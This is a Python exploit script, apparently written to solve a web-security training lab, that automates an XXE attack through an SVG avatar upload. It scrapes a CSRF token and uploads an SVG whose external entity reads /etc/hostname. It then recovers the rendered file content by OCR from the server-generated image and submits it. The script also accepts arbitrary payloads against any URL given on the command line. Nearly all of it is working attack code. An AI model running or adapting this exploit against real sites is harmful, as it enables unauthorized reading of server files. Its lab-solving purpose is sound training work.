# Exploiting XXE via image file upload

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import shutil 				# python3 -m pip install pytest-shutil

import pytesseract			# python3 -m pip install pytesseract
from PIL import Image

from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def submit_hostname(s, url, hostname):
	print('[+] Trying to submit the hostname to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": hostname}
	r = s.post(submit_path, data=submit_data)
	return r

def send_xxe(s, url, payload):
	post_comment_path = url + '/post/comment'
	postId = "1"
	if payload == "SOLUTION":
		exploit_file = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE gwyo [ <!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
<svg width="200px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/2000/xlink" version="1.1">
	<text font-family="Verdana" font-size="12" x="10" y="40">
		&xxe;
	</text>
</svg>"""
	else:
		exploit_file = payload
	csrf_token = get_csrf_token(s, url + '/post?postId=' + postId)
	exploit_files = {'avatar': ('image.svg', exploit_file, 'image/svg+xml')}
	comment_data = {
	"csrf": csrf_token,
	"postId": postId,
	"name": "gwyo",
	"comment": "comment",
	"email": "gwyo@attacker.com",
	"website": ""
	}
	print('\n[+] Using payload:\n%s' % exploit_file)
	r = s.post(post_comment_path, data=comment_data, files=exploit_files)
	time.sleep(2)
	res = r.text
	if not 'Your comment has been submitted.' in res:
		print('\n[-] Failed to upload SVG exploit as avatar <!>\n')
		sys.exit(-1)
	print('\n[+] Successfully Upload SVG exploit as avatar !\n')
	r = s.get(url + '/post?postId=' + postId)
	img_path = re.findall('src="(.*)" class="avatar">                            gwyo', r.text)[-1]
	print('[+] Trying to download the image that the server produced:\t%s' % img_path)
	img_url = url + img_path
	return img_url

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com $(cat payload08.svg)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Exploiting XXE via image file upload')
	try:
		url = sys.argv[1].strip()
		input_payload = sys.argv[2:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>').replace('=>', '=> ')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to send a comment with a SVG avatar containing a XXE attack targeting the content of /etc/hostname...")
			img_url = send_xxe(s, url, payload)
			time.sleep(2)
			r = s.get(img_url, allow_redirects=False, stream=True)
			time.sleep(2)
			if r.status_code == 200:
				print("[+] Trying to OCR the content of /etc/hostname in downloaded image...")
				with open('output-lab08.png', 'wb') as f:
					r.raw.decode_content = True
					shutil.copyfileobj(r.raw, f)
			hostname = pytesseract.image_to_string(Image.open('output-lab08.png')).strip()
			print('[+] Found hostname:\t%s' % hostname)
			time.sleep(1)
			r = submit_hostname(s, url, hostname)

			time.sleep(1)
			print(r.text)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
